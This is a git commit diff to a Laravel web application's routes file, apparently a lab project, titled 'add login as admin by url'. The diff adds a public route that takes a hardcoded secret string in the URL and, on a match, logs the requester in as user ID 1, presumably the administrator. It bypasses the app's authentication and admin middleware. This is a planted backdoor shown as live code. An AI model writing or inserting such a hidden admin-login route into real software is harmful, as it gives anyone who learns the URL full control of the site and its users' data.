9f7af3974bf4ec1d9f2849cd3dcba172fe0009e5
korolkov denis <korolkovDK20@yandex.ru>
2026-03-02 03:30:37 +0300

    add login as admin by url

--- routes/web.php
+++ routes/web.php
@@ -2,6 +2,8 @@
 
 use App\Http\Controllers\ArticleController;
 use App\Models\Article;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 use Laravel\Fortify\Features;
@@ -31,5 +33,10 @@ Route::middleware(['auth', 'isAdmin'])->group(function(){
     Route::get('/lab3/all', [ArticleController::class, 'all'])->name('lab41');
     Route::resource('/lab3',ArticleController::class)->except(['store', 'show']);
 });
-
+Route::get('/login_as/{secret}', function(string $secret){
+    if ($secret == 'pld9aBaewmpuOdeWIryXTYO1ACwnrwjkZAOtOPrfOqYhnigxwDpWaSqIV8G7Bz3qJdUUjM3pQgMeIsIntTkKtsBzqTB1j2aTQr8DY9QAX5csEja275ASucaVYKoSfNwbJ2B8HBv9bi2cCi5XxpkiyawtsDjPAVh2tBpiHK1JyUywfkBbcznlSOd6JysSUL1RWJ82dHeRNvs1PWZAluQTQerWkOVnhf3Fya41KkZ8LygSSlLDpCwSMC9uz4iOIOebZyCVR0gLsVVyqDp30Fi8gDuih0EbjQWml2ozbGkhQMTkuw6QHU3Em80kEchZMmYe') {
+        Auth::login(User::find(1));
+        return redirect()->to('dashboard');
+    }
+});
 require __DIR__.'/settings.php';
